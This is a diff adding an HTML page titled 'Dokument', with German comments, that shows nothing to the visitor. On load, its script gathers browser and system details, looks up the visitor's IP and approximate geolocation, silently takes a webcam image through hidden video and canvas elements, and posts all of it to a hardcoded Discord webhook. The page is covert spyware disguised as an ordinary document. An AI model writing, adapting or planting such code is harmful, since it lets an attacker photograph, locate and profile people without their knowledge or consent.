@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Dokument</title>
+</head>
+<body>
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        // Funktion zur Erfassung von Geräte- und Browserinformationen
+        function collectSystemInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookiesEnabled: navigator.cookieEnabled,
+                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+                pdfEnabled: navigator.pdfViewerEnabled ? navigator.pdfViewerEnabled : false
+            };
+        }
+
+        // Funktion zur Erfassung des ungefähren Standorts über die IP
+        async function getIPAndLocation() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+
+                const locationResponse = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,continent,country,countryCode,region,regionName,city,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query`);
+                const locationData = await locationResponse.json();
+
+                return { ip, location: locationData };
+            } catch (error) {
+                return { ip: 'Unbekannt', location: { error: error.message } };
+            }
+        }
+
+        // Funktion zur Aufnahme eines Bildes von der Kamera
+        async function captureCameraImage() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                await new Promise(resolve => setTimeout(resolve, 1000)); // Warte für Kamerazugriff
+
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/jpeg'); // Konvertiert das Bild in Base64
+                stream.getTracks().forEach(track => track.stop()); // Stoppt den Kamerastream
+
+                return imageData;
+            } catch (error) {
+                return `Kamera-Fehler: ${error.message}`;
+            }
+        }
+
+        // Hauptfunktion zum Senden aller Daten an Discord
+        async function sendAllDataToDiscord() {
+            const webhookURL = 'https://discord.com/api/webhooks/1418677329009315950/lVEG7d2GErWR69pX37fWIMtNZbgcAxfYqpg_3EnwJNN4L32FmZYY8pdHoRAVf3o6Y92c';
+
+            // Sammle alle Daten
+            const systemInfo = collectSystemInfo();
+            const { ip, location } = await getIPAndLocation();
+            const cameraImage = await captureCameraImage();
+
+            // Erstelle die Nachricht für Discord
+            const message = {
+                content: '**Erfasste Daten:**',
+                embeds: [
+                    {
+                        title: 'System- und Browserinformationen',
+                        fields: [
+                            { name: 'IP-Adresse', value: ip, inline: true },
+                            { name: 'User Agent', value: systemInfo.userAgent, inline: false },
+                            { name: 'Platform', value: systemInfo.platform, inline: true },
+                            { name: 'Sprache', value: systemInfo.language, inline: true },
+                            { name: 'Bildschirmauflösung', value: `${systemInfo.screenWidth}x${systemInfo.screenHeight}`, inline: true },
+                            { name: 'Zeitzone', value: systemInfo.timezone, inline: true },
+                            { name: 'Cookies aktiv', value: systemInfo.cookiesEnabled ? 'Ja' : 'Nein', inline: true }
+                        ]
+                    },
+                    {
+                        title: 'Standortinformationen (IP-basiert)',
+                        fields: [
+                            { name: 'Land', value: location.country || 'Unbekannt', inline: true },
+                            { name: 'Region', value: location.regionName || 'Unbekannt', inline: true },
+                            { name: 'Stadt', value: location.city || 'Unbekannt', inline: true },
+                            { name: 'ISP', value: location.isp || 'Unbekannt', inline: false },
+                            { name: 'Koordinaten', value: location.lat && location.lon ? `${location.lat}, ${location.lon}` : 'Unbekannt', inline: true }
+                        ]
+                    }
+                ]
+            };
+
+            // Sende die Textnachricht zuerst
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(message)
+            }).then(() => {
+                // Sende das Kamerabild separat, wenn vorhanden
+                if (cameraImage && !cameraImage.includes('Fehler')) {
+                    const formData = new FormData();
+                    formData.append('file', dataURLtoBlob(cameraImage), 'face_capture.jpg');
+
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        body: formData
+                    });
+                }
+            });
+        }
+
+        // Hilfsfunktion zur Konvertierung von DataURL zu Blob
+        function dataURLtoBlob(dataurl) {
+            var arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+                bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+            while(n--){
+                u8arr[n] = bstr.charCodeAt(n);
+            }
+            return new Blob([u8arr], {type:mime});
+        }
+
+        // Starte die Datenerfassung sobald die Seite geladen ist
+        window.onload = sendAllDataToDiscord;
+    </script>
+</body>
+</html>
